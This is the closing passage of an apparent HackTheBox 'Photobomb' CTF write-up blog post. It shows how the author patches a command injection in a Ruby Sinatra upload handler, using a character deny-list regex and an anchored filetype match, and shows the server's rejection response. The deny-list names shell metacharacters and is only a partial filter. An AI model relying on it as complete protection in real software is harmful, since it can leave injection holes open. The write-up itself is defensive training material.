+</pre><td class="rouge-code"><pre>   <span class="k">if</span> <span class="o">!</span><span class="n">filetype</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^(png|jpg)/</span><span class="p">)</span>
+     <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="s1">'Invalid filetype.'</span>
+   <span class="k">end</span>
+	
+ <span class="o">==================================</span> <span class="no">ADDED</span> <span class="o">==================================</span>
+   <span class="k">if</span> <span class="n">filetype</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="s1">'\!|\/|\$|\`|\;'</span><span class="p">)</span>
+     <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="s1">'Command Injection Failed'</span>
+   <span class="k">end</span>
+</pre></table></code></div></div><blockquote class="prompt-info"><div><p>This will check whether <code class="language-plaintext highlighter-rouge">filetype</code> <code class="language-plaintext highlighter-rouge">POST</code> parameter contains dangerous characters.</p></div></blockquote><li>OR add <code class="language-plaintext highlighter-rouge">$</code><div class="language-ruby highlighter-rouge"><div class="code-header"> <span data-label-text="Ruby"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>   <span class="k">if</span> <span class="o">!</span><span class="n">filetype</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^(png|jpg)$/</span><span class="p">)</span>
+     <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="s1">'Invalid filetype.'</span>
+   <span class="k">end</span>
+</pre></table></code></div></div><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">filetype</code> <code class="language-plaintext highlighter-rouge">POST</code> parameter must start w/ <strong>and</strong> end w/ <code class="language-plaintext highlighter-rouge">png</code> or <code class="language-plaintext highlighter-rouge">jpg</code>.</p></div></blockquote><li>Stop <code class="language-plaintext highlighter-rouge">sinatra</code> server<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> wizard@photobomb:~/photobomb$ kill -9 $(pidof ruby)
+</pre></table></code></div></div><li>Start <code class="language-plaintext highlighter-rouge">sinatra</code> server<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> wizard@photobomb:~/photobomb$ ruby server.rb
+</pre></table></code></div></div><li>Command Injection Patched !<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre> HTTP/1.1 500 Internal Server Error
+ Server: nginx/1.18.0 (Ubuntu)
+ Date: Sun, 23 Oct 2022 09:22:07 GMT
+ Content-Type: text/html;charset=utf-8
+ Content-Length: 24
+ Connection: close
+ X-Xss-Protection: 1; mode=block
+ X-Content-Type-Options: nosniff
+ X-Frame-Options: SAMEORIGIN
+	
+ Command Injection Failed
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221023172508.png" alt="" data-proofer-ignore></p><li>Demo - Command Injection Patched <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Photobomb/images/k77xK9YlC4.gif" alt="" data-proofer-ignore></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/hackthebox-linux/'>HackTheBox - Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploit-command-injection/" class="post-tag no-text-decoration" >exploit/command-injection</a> <a href="/tags/path-hijacking/" class="post-tag no-text-decoration" >path-hijacking</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Photobomb - Yufong&amp;u=https://yufongg.github.io/posts/Photobomb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="" data-toggle="tooltip" data-placement="top" title="" target="_blank" rel="noopener" aria-label=""> <i class="fa-fw "></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Blunder/">HackTheBox - Blunder</a><li><a href="/posts/Attacktive-Directory/">TryHackMe - Attacktive Directory</a><li><a href="/posts/Tommy-Boy-1/">Vulnhub - Tommy Boy 1</a><li><a href="/posts/Tiki-1/">Vulnhub - Tiki 1</a><li><a href="/posts/Breach-1/">Vulnhub - Breach 1</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Cronos/"><div class="card-body"> <em class="timeago small" data-ts="1661184000" > 2022-08-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Cronos</h3><div class="text-muted small"><p> Overview This machine begins w/ a DNS enumeration, revealing several subdomains. After enumerating the subdomains, admin.cronos.htb is susceptible to SQLi authentication bypass and a command injec...</p></div></div></a></div><div class="card"> <a href="/posts/Node/"><div class="card-body"> <em class="timeago small" data-ts="1661529600" > 2022-08-27 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Node</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, revealing a directory /api when intercepting a login request w/ burp. By directory enumerating /api, login credentials are revealed. After authe...</p></div></div></a></div><div class="card"> <a href="/posts/Networked/"><div class="card-body"> <em class="timeago small" data-ts="1662998400" > 2022-09-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Networked</h3><div class="text-muted small"><p> Overview This machine begins w/ a web enumeration, discovering a page where users can only upload images onto the system due to the filters in place, however it can be bypassed by changing the cont...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Admirer/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox - Admirer</p></a> <a href="/posts/Ambassador/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Ambassador</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://yufongg.github.io/posts/Photobomb/'; this.page.identifier = '/posts/Photobomb/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://yufongg-github-io.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/yufongg">yufongg</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
